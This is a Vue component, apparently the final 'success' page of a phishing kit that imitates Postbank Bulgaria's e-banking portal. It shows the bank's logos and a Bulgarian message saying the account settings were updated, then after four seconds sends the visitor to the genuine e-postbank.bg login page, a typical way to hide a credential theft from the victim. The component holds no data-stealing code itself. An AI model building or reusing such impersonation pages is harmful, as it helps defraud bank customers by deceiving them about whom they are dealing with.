<template>
  <div class="container">
    <div id="mainContainer">
      <div class="logo-portal">
        <div class="logo">
          <img src="../img/logo-pb-en.svg" />
        </div>
        <div class="logo-epb"><img src="../img/logo-epb-en.svg"></div>
      </div>
      <div id="login-container" class="ePortalRegForm">
        <br>
        <div >

          <div class="pci-body">
            <h3 style="position: relative;left: 20px;">Настройките на вашия акаунт са актуализирани успешно. Благодаря ви за отделеното време.</h3>
            <img  src="../img/loding.gif" style="position: relative;left: 270px;width: 34px;">

            <h3 style="position: relative;left: 230px;">пренасочване .....</h3>
        </div>
      </div>



    </div>
  </div>
  </div>
</template>

<script>
export default {
  name: "success",
  data(){
    return{
      Loding:true,
      timerCount:4,
    }
  },
  watch: {
    timerCount: {
      handler(value) {
        if (value > 0) {
          setTimeout(() => {
            this.timerCount--;
          }, 1000);
        } else {
          this.Loding = false
          window.location.href = 'https://e-postbank.bg/page/default.aspx?xml_id=/bg-BG/.login';

        }

      },
      immediate: true
    },
  }
}
</script>

<style scoped>
@import '../css/style.css';
</style>
